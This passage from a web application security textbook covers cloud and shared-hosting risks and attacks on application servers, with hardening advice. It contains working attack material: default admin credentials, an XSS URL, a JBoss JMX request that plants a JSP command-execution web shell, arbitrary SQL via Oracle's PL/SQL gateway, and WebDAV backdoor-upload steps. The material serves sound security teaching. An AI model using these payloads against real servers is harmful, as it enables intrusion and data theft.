environment where the risks are not fully qualifi ed or quantifi ed. Published 
vulnerabilities in the web applications supporting cloud services are also not 
widespread, because the web-based platform is not open to the same scrutiny 
as traditional client/server downloadable products.
This concern about loss of control is similar to existing concerns that businesses may have about choosing a hosting provider, or that consumers may 
have about choosing a web mail provider. But this issue alone does not refl ect 
the raised stakes that cloud computing brings. Whereas compromising a single 
conventional web application could affect thousands of individual users, compromising a cloud service could affect thousands of cloud subscribers, all with 
c17.indd 663 c17.indd 663 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 664
664 Chapter 17 n Attacking Application Architecture
customer bases of their own. Whereas a fl awed access control may give unauthorized access to a sensitive document in a work fl ow application, in a cloud 
self-service application it may give unauthorized access to a server or cluster 
of servers. The same vulnerability in an administrative back-end portal could 
give access to entire company infrastructures.
Cloud Security from a Web Application Perspective
With a fl uid defi nition, implemented differently by every cloud provider, no 
proscriptive list of vulnerabilities is applicable to all cloud architectures. It is, 
however, possible to identify some key areas of vulnerabilities unique to cloud 
computing architectures.
NOTE A commonly quoted defense mechanism for cloud security is the 
encryption of data at rest or in transit. However, encryption may provide 
minimal protection in this context. As described in the earlier section ‚ÄúTiered 
Architectures,‚Äù if an attacker bypasses the application‚Äôs checks for authentication 
or authorization and makes a seemingly legitimate request for data, any decryption functions are automatically invoked by components lower in the stack.
Cloned Systems
Many applications rely on features of the operating system when drawing on 
entropy to generate random numbers. Common sources are related to the features 
of the system itself, such as system uptime, or information about the system‚Äôs 
hardware. If systems are cloned, attackers possessing one of the clones could 
determine the seeds used for random-number generation, which could in turn 
allow more accurate predictions about the state of random-number generators.
Migration of Management Tools to the Cloud
At the heart of an enterprise cloud computing service is the interface through 
which servers are provisioned and monitored. This is a self-service environment for the customer, often a web-enabled version of a tool originally used for 
internal server management. Former standalone tools that have been ported to 
the web often lack robust session management and access control mechanisms, 
particularly where no role-based segregation existed previously. Some solutions 
observed by the authors have used tokens or GUIDs for server access. Others 
have simply exposed a serialization interface through which any of the management methods could be called.
Feature-First Approach
Like most new fi elds, cloud service providers promote a feature-fi rst approach in 
attracting new customers. From an enterprise perspective, cloud environments 
are nearly always managed over a self-service web application. Users are given 
c17.indd 664 c17.indd 664 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 665
 Chapter 17 n Attacking Application Architecture 665
a wide variety of user-friendly methods by which they can access their data. 
An opt-out mechanism for features generally is not offered.
Token-Based Access
Numerous cloud resources are designed to be invoked on a regular basis. This 
creates the need to store a permanent authentication token on the client, decoupled 
from the user‚Äôs password and used to identify a device (as opposed to a user). If 
an attacker can gain access to a token, he can access the user‚Äôs cloud resources.
Web Storage
Web storage is one of the main end-user attractions of cloud computing. To be 
effective, web storage should support a standard browser or browser extension, 
a range of technologies and extensions to HTTP such as WebDAV, and often 
cached or token-based credentials, as just discussed.
Another issue is that a web server on a domain is often Internet-visible. If a 
user can upload HTML and induce other users to access their upload fi le, he 
can compromise those users of the same service. Similarly, an attacker can take 
advantage of the Java same-origin policy and upload a JAR fi le, gaining full 
two-way interaction whenever that JAR fi le is invoked elsewhere on the Internet.
Securing Shared Environments
Shared environments introduce new types of threats to an application‚Äôs security, 
posed by a malicious customer of the same facility and by an unwitting customer 
who introduces vulnerabilities into the environment. To address this twofold 
danger, shared environments must be carefully designed in terms of customer 
access, segregation, and trust. They also must implement controls that are not 
directly applicable to the context of a single-hosted application.
Secure Customer Access
Whatever mechanism is provided for customers to maintain the content under 
their control, this should protect against unauthorized access by third parties 
and by malicious customers:
n The remote access mechanism should implement robust authentication, 
use cryptographic technologies that are not vulnerable to eavesdropping, 
and be fully security hardened.
n Individual customers should be granted access on a least-privilege basis. 
For example, if a customer is uploading scripts to a virtually hosted server, 
he should have only read and write permissions to his own document 
root. If a shared database is being accessed, this should be done using 
c17.indd 665 c17.indd 665 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 666
666 Chapter 17 n Attacking Application Architecture
a low-privileged account that cannot access data or other components 
belonging to other customers.
n If a customized application is used to provide customer access, it should 
be subjected to rigorous security requirements and testing in line with its 
critical role in protecting the security of the shared environment.
Segregate Customer Functionality
Customers of a shared environment cannot be trusted to create only benign 
functionality that is free of vulnerabilities. A robust solution, therefore, should 
use the architectural controls described in the fi rst half of this chapter to protect 
the shared environment and its customers from attack via rogue content. This 
involves segregating the capabilities allowed to each customer‚Äôs code as follows 
to ensure that any deliberate or unwitting compromise is localized in its impact 
and cannot affect other customers:
n Each customer‚Äôs application should use a separate operating system 
account to access the fi lesystem that has read and write access only to 
that application‚Äôs fi le paths.
n The ability to access powerful system functions and commands should be 
restricted at the operating system level on a least-privilege basis.
n The same protection should be implemented within any shared databases. 
A separate database instance should be used for each customer, and lowprivileged accounts should be assigned to customers, with access to only 
their own data.
NOTE Many shared hosting environments based on the LAMP model rely 
on PHP‚Äôs safe mode to limit the potential impact of a malicious or vulnerable script. This mode prevents PHP scripts from accessing certain powerful 
PHP functions and places restrictions on the operation of other functions 
(see Chapter 19). However, these restrictions are not fully effective and have 
been vulnerable to bypasses. Although safe mode may provide a useful layer 
of defense, it is architecturally the wrong place to control the impact of a 
malicious or vulnerable application, because it involves the operating system 
trusting the application tier to control its actions. For this reason and others, 
safe mode has been removed from PHP version 6.
TIP If you can execute arbitrary PHP commands on a server, use the 
phpinfo() command to return details of the PHP environment‚Äôs confi guration. You can review this information to establish whether safe mode is 
enabled and how other confi guration options may affect what actions you can 
easily perform. See Chapter 19 for further details.
c17.indd 666 c17.indd 666 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 667
 Chapter 17 n Attacking Application Architecture 667
Segregate Components in a Shared Application
In an ASP environment where a single application comprises various shared 
and customizable components, trust boundaries should be enforced between 
components that are under the control of different parties. When a shared component, such as a database stored procedure, receives data from a customized 
component belonging to an individual customer, this data should be treated 
with the same level of distrust as if it originated directly from an end user. 
Each component should be subjected to rigorous security testing originating 
from adjacent components outside its trust boundaries to identify any defects 
that may enable a vulnerable or malicious component to compromise the wider 
application. Particular attention should be paid to shared logging and administrative functions.
Summary
Security controls implemented within web application architectures present a 
range of opportunities for application owners to enhance the overall security 
posture of their deployment. As a consequence, defects and oversights within 
an application‚Äôs architecture often can enable you to dramatically escalate an 
attack, moving from one component to another to eventually compromise the 
entire application.
Shared hosting and ASP-based environments present a new range of diffi cult 
security problems, involving trust boundaries that do not arise within a singlehosted application. When you are attacking an application in a shared context, 
a key focus of your efforts should be the shared environment itself. You should 
try to ascertain whether it is possible to compromise that environment from 
within an individual application, or to leverage one vulnerable application to 
attack others.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. You are attacking an application that employs two different servers: an 
application server and a database server. You have discovered a vulnerability that allows you to execute arbitrary operating system commands 
on the application server. Can you exploit this vulnerability to retrieve 
sensitive application data held within the database?
 2. In a different case, you have discovered a SQL injection fl aw that can be 
exploited to execute arbitrary operating system commands on the database 
c17.indd 667 c17.indd 667 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 668
668 Chapter 17 n Attacking Application Architecture
server. Can you leverage this vulnerability to compromise the application 
server? For example, could you modify the application‚Äôs scripts held on 
the application server, and the content returned to users?
 3. You are attacking a web application that is hosted in a shared environment. 
By taking out a contract with the ISP, you can acquire some web space on 
the same server as your target, where you are permitted to upload PHP 
scripts.
Can you exploit this situation to compromise the application you are 
targeting?
 4. The architecture components Linux, Apache, MySQL, and PHP are often 
found installed on the same physical server. Why can this diminish the 
security posture of the application‚Äôs architecture?
 5. How could you look for evidence that the application you are attacking is 
part of a wider application managed by an application service provider?
c17.indd 668 c17.indd 668 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c18.indd V2 - 07/28/2011 Page 669
669
 C H A P T E R 
18
Attacking the 
Application Server
As with any kind of application, a web application depends on the other layers 
of the technology stack that support it, including the application or web server, 
operating system, and networking infrastructure. An attacker may target any 
of these components. Compromising the technology on which an application 
depends very often enables an attacker to fully compromise the application itself.
Most attacks in this category are outside the scope of a book about attacking web 
applications. One exception to this is attacks that target the application and web 
server layers, as well as any relevant application-layer defenses. Inline defenses 
are commonly employed to help secure web applications and identify attacks. 
Circumventing these defenses is a key step in compromising the application.
So far we have not drawn a distinction between a web server and an application 
server, because the attacks have targeted application functionality, irrespective 
of how it is provided. In reality, much of the presentation layer, communication 
with back-end components, and the core security framework may be managed 
by the application container. This may give additional scope to an attack. Clearly 
any vulnerability in the technologies that deliver this framework will be of interest to an attacker if they can be used to directly compromise the application.
This chapter focuses on ways of leveraging defects at the application server 
layer from an Internet perspective to attack the web application running on it. 
The vulnerabilities that you can exploit to attack application servers fall into two 
broad categories: shortcomings in the server‚Äôs confi guration, and security fl aws 
within application server software. A list of defects cannot be comprehensive, 
c18.indd 669 c18.indd 669 8/19/2011 12:17:51 PM 8/19/2011 12:17:51 PM
Stuttard c18.indd V2 - 07/28/2011 Page 670
670 Chapter 18 n Attacking the Application Server 
because software of this type is liable to change over time. But the fl aws described 
here illustrate the typical pitfalls awaiting any application implementing its own 
native extensions, modules, or APIs, or reaching outside the application container.
This chapter also examines web application fi rewalls, describes their strengths 
and weaknesses, and details ways in which they can often be circumvented to 
deliver attacks.
Vulnerable Server Confi guration
Even the simplest of web servers comes with a wealth of confi guration options 
that control its behavior. Historically, many servers have shipped with insecure 
default options, which present opportunities for attack unless they are explicitly 
hardened. 
Default Credentials
Many web servers contain administrative interfaces that may be publicly accessible. These may be located at a specifi c location within the web root or may run 
on a different port, such as 8080 or 8443. Frequently, administrative interfaces 
have default credentials that are well known and are not required to be changed 
on installation.
Table 18-1 shows examples of default credentials on some of the most commonly encountered administrative interfaces.
Table 18-1: Default Credentials on Some Common Administrative Interfaces
USERNAME PASSWORD
Apache Tomcat
admin (none)
tomcat tomcat
root root
Sun JavaServer admin admin
Netscape Enterprise Server admin admin
Compaq Insight Manager
administrator administrator
anonymous (none)
user user
operator operator
user public
Zeus admin (none)
c18.indd 670 c18.indd 670 8/19/2011 12:17:51 PM 8/19/2011 12:17:51 PM
70 Stuttard c18.indd V2 - 07/28/2011 Page 671
 Chapter 18 n Attacking the Application Server 671
In addition to administrative interfaces on web servers, numerous devices, such 
as switches, printers, and wireless access points, use web interfaces that have 
default credentials that may not have been changed. The following resources 
list default credentials for a large number of different technologies:
n www.cirt.net/passwords
n www.phenoelit-us.org/dpl/dpl.html
HACK STEPS
 1. Review the results of your application mapping exercises to identify the 
web server and other technologies in use that may contain accessible 
administrative interfaces.
 2. Perform a port scan of the web server to identify any administrative interfaces running on a different port to the main target application.
 3. For any identified interfaces, consult the manufacturer‚Äôs documentation 
and the listings of common passwords to obtain default credentials. Use 
Metasploit‚Äôs built-in database to scan the server.
 4. If the default credentials do not work, use the techniques described in 
Chapter 6 to attempt to guess valid credentials.
 5. If you gain access to an administrative interface, review the available 
functionality, and determine whether this can be used to further compromise the host and attack the main application.
Default Content
Most application servers ship with a range of default content and functionality 
that you may be able to leverage to attack either the server itself or the main target 
application. Here are some examples of default content that may be of interest:
n Debug and test functionality designed for use by administrators
n Sample functionality designed to demonstrate certain common tasks
n Powerful functions not intended for public use but unwittingly left 
accessible
n Server manuals that may contain useful information that is specifi c to 
the installation itself
Debug Functionality
Functionality designed for diagnostic use by administrators is often of great 
value to an attacker. It may contain useful information about the confi guration 
and runtime state of the server and applications running on it.
c18.indd 671 c18.indd 671 8/19/2011 12:17:51 PM 8/19/2011 12:17:51 PM
Stuttard c18.indd V2 - 07/28/2011 Page 672
672 Chapter 18 n Attacking the Application Server 
Figure 18-1 shows the default page phpinfo.php, which exists on many Apache 
installations. This page simply executes the PHP function phpinfo() and returns 
the output. It contains a wealth of information about the PHP environment, 
confi guration settings, web server modules, and fi le paths.
Figure 18-1: The default page phpinfo.php
Sample Functionality
By default many servers include various sample scripts and pages designed to 
demonstrate how certain application server functions and APIs can be used. 
Typically, these are intended to be innocuous and to provide no opportunities 
for an attacker. However, in practice this has not been the case, for two reasons:
n Many sample scripts contain security vulnerabilities that can be exploited 
to perform actions not intended by the scripts‚Äô authors.
n Many sample scripts actually implement functionality that is of direct 
use to an attacker.
An example of the fi rst problem is the Dump Servlet included in Jetty version 7.0.0. This servlet can be accessed from a URL such as /test/jsp/dump
.jsp. When it is accessed, it prints various details of the Jetty installation and 
the current request, including the request query string. This allows for simple 
c18.indd 672 c18.indd 672 8/19/2011 12:17:51 PM 8/19/2011 12:17:51 PM
72 Stuttard c18.indd V2 - 07/28/2011 Page 673
 Chapter 18 n Attacking the Application Server 673
cross-site scripting if an attacker simply includes script tags in the URL, such 
as /test/jsp/dump.jsp?%3Cscript%3Ealert(%22xss%22)%3C/script%3E.
An example of the second problem is the Sessions Example script shipped 
with Apache Tomcat. As shown in Figure 18-2, this can be used to get and set 
arbitrary session variables. If an application running on the server stores sensitive 
data in a user‚Äôs session, an attacker can view this and may be able to interfere 
with the application‚Äôs processing by modifying its value.
Figure 18-2: The default Sessions Example script shipped with Apache Tomcat
Powerful Functions
Some web server software contains powerful functionality that is not intended 
to be used by the public but that can be accessed by end users through some 
means. In many cases application servers actually allow web archives (WAR 
fi les) to be deployed over the same HTTP port as that used by the application 
itself, given the correct administrative credentials. This deployment process for 
an application server is a prime target for hackers. Common exploit frameworks 
can automate the process of scanning for default credentials, uploading a web 
archive containing a backdoor, and executing it to get a command shell on the 
remote system, as shown in Figure 18-3.
c18.indd 673 c18.indd 673 8/19/2011 12:17:51 PM 8/19/2011 12:17:51 PM
Stuttard c18.indd V2 - 07/28/2011 Page 674
674 Chapter 18 n Attacking the Application Server 
Figure 18-3: Using Metasploit to compromise a vulnerable Tomcat server
JMX
The JMX console, installed by default within a JBoss installation, is a classic 
example of powerful default content. The JMX console is described as a ‚Äúraw 
view into the microkernel of the JBoss Application Server.‚Äù In fact, it allows you 
to access any Managed Beans within the JBoss Application Server directly. Due 
to the sheer amount of functionality available, numerous security vulnerabilities 
have been reported. Among the easiest to exploit is the ability to use the store
method within the DeploymentFileRepository to create a war fi le containing 
a backdoor, as shown in Figure 18-4.
c18.indd 674 c18.indd 674 8/19/2011 12:17:52 PM 8/19/2011 12:17:52 PM
74 Stuttard c18.indd V2 - 07/28/2011 Page 675
 Chapter 18 n Attacking the Application Server 675
Figure 18-4: The JMX console contains functionality allowing arbitrary WAR files to 
be deployed
For example, the following URL uploads a page called cmdshell.jsp containing a backdoor:
http://wahh-app.com:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=
jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=
store&argType=java.lang.String&arg0=cmdshell.war&argType=
java.lang.String&arg1=cmdshell&argType=java.lang.String&arg2=
.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec
%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=
boolean&arg4=True
As shown in Figure 18-5, this successfully creates a server-side backdoor that 
executes the following code:
<%Runtime.getRuntime().exec(request.getParameter(‚Äúc‚Äù));%>
Figure 18-5: A successful attack using the JMX console to deploy a backdoor WAR file 
onto a JBoss server
c18.indd 675 c18.indd 675 8/19/2011 12:17:52 PM 8/19/2011 12:17:52 PM
Stuttard c18.indd V2 - 07/28/2011 Page 676
676 Chapter 18 n Attacking the Application Server 
The built-in Deployment Scanner then automatically deploys the Trojan 
WAR fi le to the JBoss Application Server. After it is deployed, it can be accessed 
within the newly created cmdshell application, which in this instance contains 
only cmdshell.jsp:
http://wahh-app.com:8080/cmdshell/cmdshell.jsp?c=cmd%20/
c%20ipconfig%3Ec:\foo
NOTE The resolution to this issue was to restrict the GET and POST methods to 
administrators only. This was easily bypassed simply by issuing the request just 
shown using the HEAD method. (Details can be found at www.securityfocus
.com/bid/39710/.) As with any confi guration-based vulnerability, tools such 
as Metasploit can exploit these various JMX vulnerabilities with a high degree of 
reliability.
Oracle Applications
The enduring example of powerful default functionality arises in the PL/SQL 
gateway implemented by Oracle Application Server and can be seen in other 
Oracle products such as the E-Business Suite. The PL/SQL gateway provides 
an interface whereby web requests are proxied to a back-end Oracle database. 
Arbitrary parameters can be passed to database procedures using URLs like 
the following:
https://wahh-app.com/pls/dad/package.procedure?param1=foo&param2=bar
This functionality is intended to provide a ready means of converting business 
logic implemented within a database into a user-friendly web application. However, 
because an attacker can specify an arbitrary procedure, he can exploit the PL/
SQL gateway to access powerful functions within the database. For example, the 
SYS.OWA_UTIL.CELLSPRINT procedure can be used to execute arbitrary database 
queries and thereby retrieve sensitive data:
https://wahh-app.com/pls/dad/SYS.OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+
*+FROM+users
To prevent attacks of this kind, Oracle introduced a fi lter called the PL/SQL 
Exclusion List. This checks the name of the package being accessed and blocks 
attempts to access any packages whose names start with the following expressions:
SYS.
DBMS_
UTL_
c18.indd 676 c18.indd 676 8/19/2011 12:17:52 PM 8/19/2011 12:17:52 PM
76 Stuttard c18.indd V2 - 07/28/2011 Page 677
 Chapter 18 n Attacking the Application Server 677
OWA_
OWA.
HTP.
HTF.
This fi lter was designed to block access to powerful default functionality 
within the database. However, the list was incomplete and did not block access 
to other powerful default procedures owned by DBA accounts such as CTXSYS
and MDSYS. Further problems were associated with the PL/SQL Exclusion List, 
as described later in this chapter.
Of course, the purpose of the PL/SQL gateway is to host specifi c packages 
and procedures, and many of the defaults have since been found to contain 
vulnerabilities. In 2009, the default packages forming part of the E-Business 
Suite proved to contain several vulnerabilities, including the ability to edit 
arbitrary pages. The researchers give the example of using icx_define_pages
.DispPageDialog to inject HTML into the administrator‚Äôs landing page, executing a stored cross-site scripting attack:
/pls/dad/icx_define_pages.DispPageDialog?p_mode=RENAME&amp;p_page_id=[page_id]
HACK STEPS
 1. Tools such as Nikto are effective at locating much default web content. 
The application mapping exercises described in Chapter 4 should have 
identified the majority of default content present on the server you are 
targeting.
 2. Use search engines and other resources to identify default content and 
functionality included within the technologies known to be in use. If feasible, carry out a local installation of these, and review them for any default 
functionality that you may be able to leverage in your attack.
Directory Listings
When a web server receives a request for a directory, rather than an actual fi le, 
it may respond in one of three ways:
n It may return a default resource within the directory, such as index.html.
n It may return an error, such as the HTTP status code 403, indicating that 
the request is not permitted.
n It may return a listing showing the contents of the directory, as shown 
in Figure 18-6.
c18.indd 677 c18.indd 677 8/19/2011 12:17:52 PM 8/19/2011 12:17:52 PM
Stuttard c18.indd V2 - 07/28/2011 Page 678
678 Chapter 18 n Attacking the Application Server 
Figure 18-6: A directory listing
In many situations, directory listings do not have any relevance to security. For 
example, disclosing the index to an images directory may be inconsequential. 
Indeed, directory listings are often disclosed intentionally because they provide 
a built-in means of navigating around sites containing static content, as in the 
example illustrated. Nevertheless, there are two main reasons why obtaining 
directory listings may help you attack an application:
n Many applications do not enforce proper access control over their functionality and resources and rely on an attacker‚Äôs ignorance of the URLs 
used to access sensitive items (see Chapter 8).
n Files and directories are often unintentionally left within the web root of 
servers, such as logs, backup fi les, and old versions of scripts.
In both of these cases, the real vulnerability lies elsewhere, in the failure to 
control access to sensitive data. But given that these vulnerabilities are extremely 
prevalent, and the names of the insecure resources may be diffi cult to guess, 
the availability of directory listings is often of great value to an attacker and 
may lead quickly to a complete compromise of an application.
c18.indd 678 c18.indd 678 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
78 Stuttard c18.indd V2 - 07/28/2011 Page 679
 Chapter 18 n Attacking the Application Server 679
HACK STEPS
For each directory discovered on the web server during application mapping, 
make a request for just this directory, and identify any cases where a directory 
listing is returned.
NOTE In addition to the preceding case, where directory listings are directly 
available, vulnerabilities have been discovered within web server software 
that can be exploited to obtain a directory listing. Some examples of these are 
described later in this chapter.
WebDAV Methods
WebDAV is a term given to a collection of HTTP methods used for Web-based 
Distributed Authoring and Versioning. These have been widely available since 
1996. They have been more recently adopted in cloud storage and collaboration 
applications, where user data needs to be accessed across systems using an 
existing fi rewall-friendly protocol such as HTTP. As described in Chapter 3, 
HTTP requests can use a range of methods other than the standard GET and POST
methods. WebDAV adds numerous others that can be used to manipulate fi les 
on the web server. Given the nature of the functionality, if these are accessible 
by low-privileged users, they may provide an effective avenue for attacking an 
application. Here are some methods to look for:
n PUT uploads the attached fi le to the specifi ed location.
n DELETE deletes the specifi ed resource.
n COPY copies the specifi ed resource to the location given in the Destination
header.
n MOVE moves the specifi ed resource to the location given in the Destination
header.
n SEARCH searches a directory path for resources.
n PROPFIND retrieves information about the specifi ed resource, such as 
author, size, and content type.
You can use the OPTIONS method to list the HTTP methods that are permitted 
in a particular directory:
OPTIONS /public/ HTTP/1.0
Host: mdsec.net
HTTP/1.1 200 OK
Connection: close
Date: Sun, 10 Apr 2011 15:56:27 GMT
c18.indd 679 c18.indd 679 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
Stuttard c18.indd V2 - 07/28/2011 Page 680
680 Chapter 18 n Attacking the Application Server 
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIN
D, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Cache-Control: private
This response indicates that several of the powerful methods listed previously 
are in fact allowed. However, in practice these may require authentication or be 
subject to other restrictions.
The PUT method is particularly dangerous. If you upload arbitrary fi les within 
the web root, the fi rst target is to create a backdoor script on the server that will 
be executed by a server-side module, thereby giving the attacker full control of 
the application, and often the web server itself. If the PUT method appears to be 
present and enabled, you can verify this as follows:
PUT /public/test.txt HTTP/1.1
Host: mdsec.net
Content-Length: 4
test
HTTP/1.1 201 Created
...
Note that permissions are likely to be implemented per directory, so recursive 
checking is required in an attack. Tools such as DAVTest, shown next, can be 
used to iteratively check all directories on the server for the PUT method and 
determine which fi le extensions are allowed. To circumvent restrictions on using 
PUT to upload backdoor scripts, the tool also attempts to use PUT followed by 
the MOVE method:
C:\>perl davtest.pl -url http://mdsec.net/public -directory 1 -move -quiet
MOVE .asp FAIL
MOVE .shtml FAIL
MOVE .aspx FAIL
davtest.pl Summary:
Created: http://mdsec.net/public/1
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.php
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.html
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.cgi
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.cfm
c18.indd 680 c18.indd 680 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
80 Stuttard c18.indd V2 - 07/28/2011 Page 681
 Chapter 18 n Attacking the Application Server 681
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.jsp
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.pl
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.txt
MOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.jhtml
Executes: http://mdsec.net/public/1/davtest_UmtllhI8izy2.html
Executes: http://mdsec.net/public/1/davtest_UmtllhI8izy2.txt
TRY IT!
http://mdsec.net/public/
TIP For WebDAV instances where end users are permitted to upload fi les, it 
is relatively common for uploading server-side scripting language extensions 
specifi c to that server‚Äôs environment to be forbidden. The ability to upload 
HTML or JAR fi les is much more likely, and both of these allow attacks against 
other users to be conducted (see Chapters 12 and 13).
HACK STEPS
To test the server‚Äôs handling of different HTTP methods, you will need to use 
a tool such as Burp Repeater, which allows you to send an arbitrary request 
with full control over the message headers and body. 
 1. Use the OPTIONS method to list the HTTP methods that the server states 
are available. Note that different methods may be enabled in different 
directories.
 2. In many cases, methods may be advertised as available that you cannot in 
fact use. Sometimes, a method may be usable even though it is not listed 
in the response to the OPTIONS request. Try each method manually to 
confirm whether it can in fact be used.
 3. If you find that some WebDAV methods are enabled, it is often easiest to 
use a WebDAV-enabled client for further investigation, such as Microsoft 
FrontPage or the Open as Web Folder option within Internet Explorer.
 a. Attempt to use the PUT method to upload a benign file, such as a 
text file.
 b. If this is successful, try uploading a backdoor script using PUT.
 c. If the necessary extension for the backdoor to operate is being 
blocked, try uploading the file with a .txt extension and using the 
MOVE method to move it to a file with a new extension.
 d. If any of the preceding methods fails, try uploading a JAR file, or a file 
with contents that a browser will render as HTML.
 e. Recursively step through all the directories using a tool such as 
davtest.pl.
c18.indd 681 c18.indd 681 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
Stuttard c18.indd V2 - 07/28/2011 Page 682
682 Chapter 18 n Attacking the Application Server 
The Application Server as a Proxy
Web servers are sometimes confi gured to act as forward or reverse HTTP proxy 
servers (see Chapter 3). If a server is confi gured as a forward proxy, depending on its 
confi guration, it may be possible to leverage the server to perform various attacks:
n An attacker may be able to use the server to attack third-party systems on 
the Internet, with the malicious traffi c appearing to the target to originate 
from the vulnerable proxy server.
n An attacker may be able to use the proxy to connect to arbitrary hosts on 
the organization‚Äôs internal network, thereby reaching targets that cannot 
be accessed directly from the Internet.
n An attacker may be able to use the proxy to connect back to other services 
running on the proxy host itself, circumventing fi rewall restrictions and 
potentially exploiting trust relationships to bypass authentication.
You can use two main techniques to cause a forward proxy to make onward 
connections. First, you can send an HTTP request containing a full URL including a hostname and (optionally) a port number:
GET http://wahh-otherapp.com:80/ HTTP/1.0
HTTP/1.1 200 OK
...
If the server has been confi gured to forward requests to the specifi ed host, it 
returns content from that host. Be sure to verify that the content returned is not 
from the original server, however. Most web servers accept requests containing 
full URLs, and many simply ignore the host portion and return the requested 
resource from within their own web root.
The second way of leveraging a proxy is to use the CONNECT method to specify 
the target hostname and port number:
CONNECT wahh-otherapp.com:443 HTTP/1.0
HTTP/1.0 200 Connection established
If the server responds in this way, it is proxying your connection. This second 
technique is often more powerful because the proxy server now simply forwards 
all traffi c sent to and from the specifi ed host. This enables you to tunnel other 
protocols over the connection and attack non-HTTP‚Äìbased services. However, 
most proxy servers impose narrow restrictions on the ports that can be reached 
via the CONNECT method and usually allow only connections to port 443.
The available techniques for exploiting this attack are described in ServerSide HTTP Redirection (Chapter 10).
c18.indd 682 c18.indd 682 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
82 Stuttard c18.indd V2 - 07/28/2011 Page 683
 Chapter 18 n Attacking the Application Server 683
HACK STEPS
 1. Using both GET and CONNECT requests, try to use the web server as a 
proxy to connect to other servers on the Internet and retrieve content 
from them.
 2. Using both techniques, attempt to connect to different IP addresses and 
ports within the hosting infrastructure.
 3. Using both techniques, attempt to connect to common port numbers on the 
web server itself by specifying 127.0.0.1 as the target host in the request.
Misconfi gured Virtual Hosting
Chapter 17 described how web servers can be confi gured to host multiple websites, with the HTTP Host header being used to identify the website whose 
content should be returned. In Apache, virtual hosts are confi gured as follows:
<VirtualHost *>
 ServerName eis
 DocumentRoot /var/www2
</VirtualHost>
In addition to the DocumentRoot directive, virtual host containers can be used 
to specify other confi guration options for the website in question. A common confi guration mistake is to overlook the default host so that any security confi guration 
applies to only a virtual host and can be bypassed when the default host is accessed.
HACK STEPS
 1. Submit GET requests to the root directory using the following:
n The correct Host header.
n An arbitrary Host header.
n The server‚Äôs IP address in the Host header.
n No Host header.
 2. Compare the responses to these requests. For example, when an IP 
address is used in the Host header, the server may simply respond with 
a directory listing. You may also find that different default content is 
accessible.
 3. If you observe different behavior, repeat your application mapping exercises using the Host header that generated different results. Be sure to 
perform a Nikto scan using the -vhost option to identify any default content that may have been overlooked during initial application mapping.
c18.indd 683 c18.indd 683 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
Stuttard c18.indd V2 - 07/28/2011 Page 684
684 Chapter 18 n Attacking the Application Server 
Securing Web Server Confi guration
Securing the confi guration of a web server is not inherently diffi cult. Problems 
typically arise through an oversight or a lack of awareness. The most important 
task is to fully understand the documentation for the software you are using 
and any hardening guides available in relation to it.
In terms of generic confi guration issues to address, be sure to include all of 
the following areas:
n Change any default credentials, including both usernames and passwords 
if possible. Remove any default accounts that are not required.
n Block public access to administrative interfaces, either by placing ACLs 
on the relevant paths within the web root or by fi rewalling access to 
nonstandard ports.
n Remove all default content and functionality that is not strictly required for 
business purposes. Browse the contents of your web directories to identify 
any remaining items, and use tools such as Nikto as a secondary check.
n If any default functionality is retained, harden this as far as possible to 
disable unnecessary options and behavior.
n Check all web directories for directory listings. Where possible, disable 
directory listings in a server-wide confi guration. You can also ensure 
that each directory contains a fi le such as index.html, which the server 
is confi gured to serve by default.
n Disable all methods other than those used by the application (typically 
GET and POST).
n Ensure that the web server is not confi gured to run as a proxy. If this functionality is actually required, harden the confi guration as far as possible to allow 
connections only to the specifi c hosts and ports that should be legitimately 
accessed. You may also implement network-layer fi ltering as a secondary 
measure to control outbound requests originating from the web server.
n If your web server supports virtual hosting, ensure that any security hardening applied is enforced on the default host. Perform the tests described 
previously to verify that this is the case.
Vulnerable Server Software
Web server products range from extremely simple and lightweight software that 
does little more than serve static pages to highly complex application platforms 
that can handle a variety of tasks, potentially providing all but the business 
logic itself. In the latter example, it is common to develop on the assumption 
c18.indd 684 c18.indd 684 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
84 Stuttard c18.indd V2 - 07/28/2011 Page 685
 Chapter 18 n Attacking the Application Server 685
that this framework is secure. Historically, web server software has been subject to a wide range of serious security vulnerabilities, which have resulted 
in arbitrary code execution, fi le disclosure, and privilege escalation. Over the 
